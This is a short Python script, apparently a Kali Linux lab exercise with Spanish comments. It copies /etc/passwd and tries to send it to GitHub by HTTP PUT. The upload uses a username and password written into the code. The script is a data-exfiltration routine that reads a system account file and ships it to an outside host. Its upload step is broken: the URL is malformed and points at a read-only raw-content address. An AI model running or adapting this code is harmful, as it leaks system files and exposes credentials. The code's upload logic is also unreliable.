import subprocess
import requests
from requests.auth import HTTPBasicAuth

def run():
    # Copiar /etc/passwd a /home/kali/Desktop
    subprocess.run(['cp', '/etc/passwd', '/home/kali/Desktop'])

    # Definir las variables
    GITHUB_REPO = 'almacenlar'
    GITHUB_USER = 'lauraalmrui'
    GITHUB_PASSWORD = 'Monlau22'

    # Autenticarse en GitHub
    auth = HTTPBasicAuth(GITHUB_USER, GITHUB_PASSWORD)

    # Realizar la carga a GitHub
    file_path = '/home/kali/Desktop/passwd'
    git_file = f'https://raw.githubusercontent.com/{GITHUB_REPO}/master/{file_path}'
    content = open(file_path, 'r').read()

    response = requests.put(git_file, auth=auth, data=content)

    if response.status_code == 200:
        print(git_file + ' UPDATED')
    elif response.status_code == 201:
        print(git_file + ' CREATED')
    else:
        print('Error:', response.status_code)

run()
